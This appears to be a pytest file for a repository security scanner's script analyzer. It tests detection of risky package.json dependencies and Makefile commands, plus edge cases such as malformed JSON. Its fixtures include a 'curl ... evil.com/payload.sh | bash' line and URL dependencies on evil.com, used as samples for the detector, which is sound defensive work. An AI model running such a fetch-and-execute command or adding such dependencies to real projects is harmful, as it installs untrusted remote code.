"""Additional script analyzer tests — edge cases and uncovered branches."""
import json

import pytest

from reporeaver.analyzers.script_analyzer import ScriptAnalyzer
from reporeaver.models import FileEntry


@pytest.fixture
def analyzer():
    return ScriptAnalyzer()


class TestShouldAnalyze:
    def test_package_json(self):
        e = FileEntry(path="package.json", size=100, hash_sha256="x", is_text=True)
        assert ScriptAnalyzer().should_analyze(e)

    def test_makefile(self):
        e = FileEntry(path="Makefile", size=100, hash_sha256="x", is_text=True)
        assert ScriptAnalyzer().should_analyze(e)

    def test_shell_script(self):
        e = FileEntry(path="deploy.sh", size=100, hash_sha256="x", is_text=True)
        assert ScriptAnalyzer().should_analyze(e)

    def test_non_script(self):
        e = FileEntry(path="README.md", size=100, hash_sha256="x", is_text=True)
        assert not ScriptAnalyzer().should_analyze(e)


class TestPackageJsonEdgeCases:
    def test_invalid_json_returns_empty(self, analyzer):
        e = FileEntry(path="package.json", size=10, hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, "not json{{{")
        assert len(res.findings) == 0

    def test_non_dict_scripts_field(self, analyzer):
        content = json.dumps({"scripts": "should be a dict"})
        e = FileEntry(path="package.json", size=len(content), hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, content)
        assert len(res.findings) == 0

    def test_non_string_command_skipped(self, analyzer):
        content = json.dumps({"scripts": {"build": 123}})
        e = FileEntry(path="package.json", size=len(content), hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, content)
        assert len(res.findings) == 0

    def test_non_string_version_skipped(self, analyzer):
        content = json.dumps({"dependencies": {"pkg": 1}})
        e = FileEntry(path="package.json", size=len(content), hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, content)
        assert len(res.findings) == 0

    def test_url_dependency_detected(self, analyzer):
        content = json.dumps({"dependencies": {"evil-pkg": "https://evil.com/pkg.tar.gz"}})
        e = FileEntry(path="package.json", size=len(content), hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, content)
        titles = [f.title for f in res.findings]
        assert any("URL" in t for t in titles)

    def test_non_dict_dependencies_does_not_crash(self, analyzer):
        content = json.dumps({"dependencies": "not-a-dict"})
        e = FileEntry(path="package.json", size=len(content), hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, content)
        assert len(res.findings) == 0

    def test_mixed_valid_invalid_deps(self, analyzer):
        content = json.dumps({
            "dependencies": {"safe-pkg": "1.0.0", "url-pkg": "https://evil.com/pkg"},
            "devDependencies": "not-a-dict"
        })
        e = FileEntry(path="package.json", size=len(content), hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, content)
        assert len(res.findings) >= 1


class TestMakefilePatterns:
    def test_curl_pipe_bash_detected(self, analyzer):
        e = FileEntry(path="Makefile", size=100, hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, "curl -sSL http://evil.com/payload.sh | bash")
        descs = [f.description for f in res.findings]
        assert any("bash" in d.lower() for d in descs)

    def test_clean_makefile(self, analyzer):
        e = FileEntry(path="Makefile", size=100, hash_sha256="x", is_text=True)
        res = analyzer.analyze(e, "CC=gcc\nCFLAGS=-O2\nall: clean build")
        assert len(res.findings) == 0
